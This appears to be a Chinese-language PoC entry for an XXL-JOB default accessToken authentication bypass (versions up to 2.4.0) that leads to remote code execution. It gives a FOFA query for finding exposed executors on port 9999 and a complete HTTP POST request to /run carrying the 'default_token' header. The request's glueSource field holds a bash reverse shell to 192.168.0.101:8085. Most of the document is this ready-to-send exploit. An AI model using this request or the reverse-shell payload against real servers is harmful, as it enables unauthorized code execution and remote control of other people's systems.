## XXL-JOB默认accessToken身份绕过漏洞

XXL-JOB是一款开源的分布式任务调度平台，用于实现大规模任务的调度和执行。该漏洞是由于XXL-JOB 在默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值，如果用户没有修改该默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，导致远程代码执行。

## 漏洞影响

```
2.31< XXL-JOB <= 2.4.0
```

## fofa

```
"invalid request, HttpMethod not support" && port="9999"
```

## poc

请求头加上XXL-JOB-ACCESS-TOKEN: default_token

```
POST /run HTTP/1.1
Host: 127.0.0.1:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
XXL-JOB-ACCESS-TOKEN: default_token
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Length: 365

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "bash -i >& /dev/tcp/192.168.0.101/8085 0>&1",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

![image-20240706142307631](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407061423702.png)

## 漏洞复现

```
https://mp.weixin.qq.com/s/9vcIRCbKyisFq3vPXmiMkQ
https://www.cnblogs.com/chm0d/p/17805168.html
```

